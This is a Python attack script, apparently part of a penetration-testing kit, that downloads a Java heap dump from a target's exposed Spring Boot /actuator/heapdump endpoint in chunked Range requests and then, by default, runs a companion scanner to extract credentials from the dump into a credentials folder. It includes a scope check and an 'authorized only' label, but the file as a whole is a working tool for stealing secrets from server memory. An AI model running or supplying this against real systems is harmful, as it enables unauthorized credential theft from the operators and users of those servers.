#!/usr/bin/env python3
"""Range-chunk heapdump fetch with IP/HOSTNAME/Content-Range bucketing (authorized only)."""
from __future__ import annotations

import argparse
import json
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

def _kit_ops_dir(start: Path) -> Path:
    here = start.resolve()
    if here.is_file():
        here = here.parent
    for p in (here, *here.parents):
        fang = p / "炼蛊房"
        if (fang / "scope_lib.py").is_file():
            return fang
        ops = p / "tools" / "ops"
        if (ops / "scope_lib.py").is_file():
            return ops
    return here

ENGINE = Path(__file__).resolve().parents[3]
OPS = _kit_ops_dir(Path(__file__))
SCAN_PY = OPS / "heap_cred_scan.py"
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

CTX = ssl.create_default_context()


def http_range(url: str, start: int, end: int | None, timeout: int = 120):
    headers = {
        "User-Agent": "sgc-heapdump/1.0",
        "Accept": "*/*",
        "Range": f"bytes={start}-{end if end is not None else ''}",
    }
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
        data = r.read()
        return {
            "status": r.status,
            "content_range": r.headers.get("Content-Range", ""),
            "content_length": r.headers.get("Content-Length", ""),
            "hostname_hint": r.headers.get("X-Hostname") or r.headers.get("X-Server") or "",
            "data": data,
        }


def probe_total(url: str) -> tuple[int, str]:
    info = http_range(url, 0, 0)
    cr = info["content_range"]  # bytes 0-0/TOTAL
    total = -1
    if "/" in cr:
        try:
            total = int(cr.rsplit("/", 1)[-1])
        except ValueError:
            total = -1
    return total, cr


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="https://host/actuator/heapdump")
    ap.add_argument("--out", required=True, help="output .hprof or directory")
    ap.add_argument("--chunk", type=int, default=8 * 1024 * 1024, help="chunk size bytes")
    ap.add_argument("--pin-ip", default="", help="optional pinned node IP for meta only")
    ap.add_argument("--hostname", default="", help="optional HOSTNAME label for bucket")
    ap.add_argument("--max-bytes", type=int, default=0, help="stop after N bytes (0=all)")
    ap.add_argument("--no-scan", action="store_true", help="只下堆，不拆（默认下完立刻 heap_cred_scan）")
    ap.add_argument("--scan-out", default="", help="凭据目录，默认 <hprof>_creds")
    ap.add_argument("--case", default="", help="拆堆时写入案卷 测绘/heap_creds/")
    args = ap.parse_args()

    host = host_of(args.url)
    if host and not in_scope(host):
        raise SystemExit(f"[scope] {host} 不在授权范围")

    out = Path(args.out)
    if out.is_dir() or str(args.out).endswith("/"):
        out.mkdir(parents=True, exist_ok=True)
        label = args.hostname or args.pin_ip or "node"
        out = out / f"heapdump_{label}.hprof"
    out.parent.mkdir(parents=True, exist_ok=True)
    meta_path = out.with_suffix(out.suffix + ".meta.json")

    total, cr0 = probe_total(args.url)
    print(f"[*] Content-Range probe: {cr0} total={total}")
    if total <= 0:
        raise SystemExit("cannot determine total size from Range probe")

    meta = {
        "url": args.url,
        "pin_ip": args.pin_ip,
        "hostname": args.hostname,
        "total": total,
        "chunk": args.chunk,
        "started_at": time.time(),
        "chunks": [],
    }
    limit = args.max_bytes if args.max_bytes > 0 else total
    written = 0
    with out.open("wb") as f:
        while written < limit:
            end = min(written + args.chunk - 1, limit - 1)
            for attempt in range(5):
                try:
                    info = http_range(args.url, written, end)
                    if info["status"] not in (200, 206):
                        raise RuntimeError(f"bad status {info['status']}")
                    f.write(info["data"])
                    meta["chunks"].append(
                        {
                            "start": written,
                            "end": end,
                            "got": len(info["data"]),
                            "content_range": info["content_range"],
                            "status": info["status"],
                        }
                    )
                    written += len(info["data"])
                    print(f"[+] {written}/{limit}  {info['content_range']}")
                    break
                except Exception as e:
                    print(f"[!] retry {attempt+1}/5 @ {written}-{end}: {e}")
                    time.sleep(1.5 * (attempt + 1))
            else:
                raise SystemExit(f"failed at offset {written}")
            meta_path.write_text(json.dumps(meta, ensure_ascii=False, indent=2), encoding="utf-8")

    meta["finished_at"] = time.time()
    meta["bytes_written"] = written
    meta_path.write_text(json.dumps(meta, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"[=] wrote {out} ({written} bytes) meta={meta_path}")
    print("[!] bucket by pin_ip+hostname+total — do not merge dumps across nodes")
    if args.no_scan:
        return
    if not SCAN_PY.is_file():
        print("[!] heap_cred_scan.py missing, skip spider", file=sys.stderr)
        return
    cred = Path(args.scan_out) if args.scan_out else out.parent / f"{out.stem}_creds"
    print(f"[*] auto heap_cred_scan → {cred}")
    scan_cmd = [sys.executable, str(SCAN_PY), str(out), "--out", str(cred)]
    if args.case:
        scan_cmd.extend(["--case", args.case])
    r = subprocess.run(scan_cmd, check=False)
    if r.returncode != 0:
        print(f"[!] heap_cred_scan exit {r.returncode}", file=sys.stderr)


if __name__ == "__main__":
    main()
